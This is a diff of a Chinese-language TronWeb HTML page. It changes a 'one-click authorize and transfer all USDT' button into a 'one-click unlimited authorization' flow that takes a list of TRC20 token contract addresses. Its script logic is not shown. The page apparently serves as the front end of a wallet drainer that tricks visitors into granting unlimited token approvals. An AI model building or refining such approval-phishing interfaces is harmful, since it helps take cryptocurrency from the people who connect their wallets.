@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 一键式授权</title>
+    <title>TRC20 无限授权与批量授权</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { font-family: Arial, sans-serif; }
@@ -12,8 +12,14 @@
 </head>
 <body>
 
-    <h1>TRC20 一键式授权</h1>
-    <button id="approveBtn">一键授权并转账所有USDT</button>
+    <h1>TRC20 无限授权与批量授权</h1>
+    
+    <div>
+        <label for="tokens">输入代币合约地址（用逗号分隔）:</label><br>
+        <input type="text" id="tokens" placeholder="如：TOKEN_ADDRESS_1, TOKEN_ADDRESS_2" style="width: 100%;">
+    </div>
+    
+    <button id="approveBtn">一键无限授权</button>
     <p id="status"></p>
 
     <script src="script.js"></script>
